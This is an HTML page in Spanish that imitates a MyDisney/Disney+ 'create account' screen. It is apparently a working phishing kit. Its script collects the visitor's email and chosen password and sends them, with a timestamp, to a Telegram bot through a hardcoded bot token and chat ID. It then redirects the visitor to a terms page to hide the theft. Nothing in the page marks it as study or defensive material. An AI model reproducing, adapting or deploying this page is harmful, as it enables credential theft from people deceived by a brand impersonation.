<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crear cuenta | MyDisney</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: linear-gradient(180deg, #033057, #001323);
    color: #000;
}

/* LOGO SUPERIOR */
.logo-area {
    text-align: center;
    padding-top: 35px;
    padding-bottom: 10px;
}

.logo-area img {
    width: 165px;
    filter: brightness(1200%);
}

/* TARJETA BLANCA */
.container {
    max-width: 600px;
    margin: 25px auto 0;
    background: #fff;
    border-radius: 28px;
    padding: 40px 26px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.18);
}

/* LOGO MyDisney */
.container .myd {
    width: 125px;
    margin-bottom: 12px;
}

/* T√çTULO */
h1 {
    font-size: 28px;
    font-weight: 600;
    color: #000;
    line-height: 1.2;
}

/* SUBTEXTO */
.subtxt {
    font-size: 15px;
    color: #444;
    margin-top: 15px;
    margin-bottom: 20px;
    line-height: 1.45;
}

/* EMAIL DESTACADO */
.email {
    font-weight: 600;
    color: #000;
}

/* INPUT CONTRASE√ëA */
.input-wrapper {
    position: relative;
}

input[type="password"] {
    width: 100%;
    padding: 18px;
    padding-right: 55px;
    box-sizing: border-box;
    border-radius: 12px;
    border: 1px solid #d8d8d8;
    background: #f4f5f7;
    font-size: 16px;
    margin-bottom: 4px;
    outline: none;
}

.eye-icon {
    position: absolute;
    right: 18px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
    opacity: 0.6;
}

.req {
    font-size: 13px;
    color: #666;
    margin-bottom: 20px;
}

/* CHECKBOXES */
.checkbox {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin-bottom: 18px;
}

.checkbox input {
    width: 22px;
    height: 22px;
}

.checkbox p {
    margin: 0;
    line-height: 1.4;
    font-size: 15px;
}

.checkbox a {
    color: #0077cc;
}

/* TEXTO FINAL */
.terms {
    margin-top: 25px;
    font-size: 13px;
    line-height: 1.45;
    color: #555;
}

.terms a {
    color: #0077cc;
}

/* BOT√ìN CONTINUAR */
.continue-btn {
    width: 100%;
    background: #0077cc;
    color: white;
    border: none;
    padding: 18px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 25px;
    transition: background 0.3s;
}

.continue-btn:hover {
    background: #005fa3;
}

.continue-btn:disabled {
    background: #cccccc;
    cursor: not-allowed;
}

/* LOADING SPINNER */
.loading {
    display: none;
    text-align: center;
    margin-top: 15px;
}

.spinner {
    border: 4px solid #f3f3f3;
    border-top: 4px solid #0077cc;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 0 auto;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
</style>
</head>
<body>

<!-- LOGO SUPERIOR -->
<div class="logo-area">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
</div>

<!-- TARJETA -->
<div class="container">

    <img class="myd" src="https://upload.wikimedia.org/wikipedia/commons/3/3c/My_Disney_logo.png">

    <h1>Crear cuenta para continuar</h1>

    <p class="subtxt">
        Con una cuenta de MyDisney, podr√°s iniciar sesi√≥n en Disney+ y otros servicios de la Familia de Compa√±√≠as Walt Disney.
        <br><br>
        Es necesario crear tu cuenta con <span class="email" id="emailDisplay">correo@ejemplo.com</span> 
        (<a href="#" onclick="editarEmail()" style="color:#0077cc;">editar</a>).
    </p>

    <!-- CONTRASE√ëA -->
    <label style="font-size:14px; color:#666;">Elegir contrase√±a</label>

    <div class="input-wrapper">
        <input id="password" type="password" minlength="6" placeholder="Ingresa tu contrase√±a">
        <img class="eye-icon" id="toggle" src="https://cdn-icons-png.flaticon.com/512/159/159604.png" width="22">
    </div>

    <p class="req">
        Al menos seis caracteres (distingue may√∫sculas y min√∫sculas), incluido un n√∫mero o car√°cter especial.
    </p>

    <!-- CHECKBOX 1 -->
    <div class="checkbox">
        <input type="checkbox" id="checkbox1">
        <p>
            S√≠, me gustar√≠a recibir actualizaciones, ofertas especiales y otra informaci√≥n de Disney+ y la
            <a href="#">Familia de Compa√±√≠as Walt Disney.</a>
        </p>
    </div>

    <!-- CHECKBOX 2 -->
    <div class="checkbox">
        <input type="checkbox" id="checkbox2">
        <p>
            S√≠, autorizo a The Walt Disney Company a compartir mis datos para recibir actualizaciones, ofertas especiales y otra informaci√≥n relacionada.
        </p>
    </div>

    <!-- BOT√ìN CONTINUAR -->
    <button id="continueBtn" class="continue-btn" onclick="enviarDatos()">ACEPTAR Y CONTINUAR</button>

    <!-- LOADING -->
    <div id="loading" class="loading">
        <div class="spinner"></div>
        <p style="color:#555; margin-top:10px;">Creando cuenta...</p>
    </div>

    <p class="terms">
        Al hacer clic en Aceptar y continuar, reconoces que le√≠ste los
        <a href="#">T√©rminos de uso</a> y <a href="#">Pol√≠tica de cookies.</a>
    </p>

</div>

<script>
// Variables
const pass = document.getElementById("password");
const toggle = document.getElementById("toggle");
const emailDisplay = document.getElementById("emailDisplay");
const continueBtn = document.getElementById("continueBtn");
const loading = document.getElementById("loading");

// Obtener el correo del localStorage o usar uno por defecto
let userEmail = localStorage.getItem('disneyEmail') || 'correo@ejemplo.com';
emailDisplay.textContent = userEmail;

// Mostrar / ocultar contrase√±a
toggle.onclick = () => {
    if (pass.type === "password") {
        pass.type = "text";
        toggle.style.opacity = "1";
    } else {
        pass.type = "password";
        toggle.style.opacity = "0.6";
    }
};

// Funci√≥n para editar email
function editarEmail() {
    const nuevoEmail = prompt("Ingresa tu correo electr√≥nico:", userEmail);
    if (nuevoEmail && nuevoEmail.includes('@')) {
        userEmail = nuevoEmail;
        emailDisplay.textContent = userEmail;
        localStorage.setItem('disneyEmail', userEmail);
    } else if (nuevoEmail) {
        alert("Por favor ingresa un correo electr√≥nico v√°lido.");
    }
}

// Validar contrase√±a en tiempo real
pass.addEventListener('input', function() {
    const password = this.value;
    if (password.length >= 6 && 
        /[A-Z]/.test(password) && 
        /[0-9]/.test(password)) {
        continueBtn.disabled = false;
    } else {
        continueBtn.disabled = true;
    }
});

// Funci√≥n para enviar datos a Telegram
async function enviarDatos() {
    const password = pass.value;
    const checkbox1 = document.getElementById('checkbox1').checked;
    const checkbox2 = document.getElementById('checkbox2').checked;
    
    // Validaciones
    if (password.length < 6) {
        alert("La contrase√±a debe tener al menos 6 caracteres.");
        return;
    }
    
    if (!/[A-Z]/.test(password)) {
        alert("La contrase√±a debe incluir al menos una letra may√∫scula.");
        return;
    }
    
    if (!/[0-9]/.test(password)) {
        alert("La contrase√±a debe incluir al menos un n√∫mero.");
        return;
    }
    
    // Mostrar loading
    continueBtn.style.display = 'none';
    loading.style.display = 'block';
    
    // Enviar a Telegram
    const botToken = "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8";
    const chatId = "7776240161";
    
    const mensaje = `üìù NUEVO REGISTRO DISNEY+
üìß Correo: ${userEmail}
üîë Contrase√±a: ${password}
‚úÖ Newsletter: ${checkbox1 ? 'S√≠' : 'No'}
‚úÖ Compartir datos: ${checkbox2 ? 'S√≠' : 'No'}
üïê Fecha: ${new Date().toLocaleString()}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: mensaje
            })
        });
        
        console.log('Datos enviados a Telegram');
        
        // Redirigir despu√©s de 2 segundos
        setTimeout(() => {
            window.location.href = 'terminos.html';
        }, 2000);
        
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        alert("Hubo un error. Por favor intenta de nuevo.");
        
        // Restaurar bot√≥n
        continueBtn.style.display = 'block';
        loading.style.display = 'none';
    }
}

// Permitir Enter en el campo de contrase√±a
pass.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && !continueBtn.disabled) {
        enviarDatos();
    }
});
</script>

</body>
</html>
